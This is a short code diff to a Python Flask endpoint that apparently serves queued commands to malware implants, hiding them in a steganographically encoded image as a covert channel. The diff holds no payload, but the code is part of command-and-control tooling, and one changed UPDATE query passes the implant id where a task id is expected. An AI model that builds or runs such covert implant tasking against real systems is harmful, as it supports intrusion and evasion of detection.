@@ -110,7 +110,7 @@ def get_qcommands():
     # if [";", "\'", "\""] in id:
     #     return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}
     try:
-        query = sql.SQL("select * from {table} where {column} = %s").format(
+        query = sql.SQL("select task_id, target_implant_id, command from {table} where {column} = %s").format(
             table=sql.Identifier('task_queue'),
             column=sql.Identifier('target_implant_id'))
         db_resp = tools.executeSelectQueryVars(query, [id])
@@ -119,12 +119,20 @@ def get_qcommands():
         if db_resp == None:
             db_resp = {"commands": "No commands found"}
         data = json.dumps(db_resp)
-        query = "UPDATE task_queue SET status=%s WHERE id=%s"
+        query = "UPDATE task_queue SET status=%s WHERE task_id=%s"
         tools.executeGenericVar(query, ['executing', id])
 
-        SteganographyFixed.createEncodedImage("doge.png", data, "doge_ecnoded.png")
+        didNotWork = SteganographyFixed.createEncodedImage("doge.png", data, "doge_encoded.png")
+
+        if (didNotWork != None):
+            print()
+            print()
+            print(didNotWork)
+            print()
+            print()
+            return didNotWork
         
-        return send_file('doge_encoded.png', mimetype='image/png'), {'Access-Control-Allow-Origin': config.clientURL}
+        return send_file('doge_encoded.png', as_attachment=True), {'Access-Control-Allow-Origin': config.clientURL}
 
     except Exception as error:
         print("failed to retrieve data on get_qcommands")
@@ -361,3 +369,4 @@ def get_history():
 
 # if __name__ == "__main__":
 #     main()
+
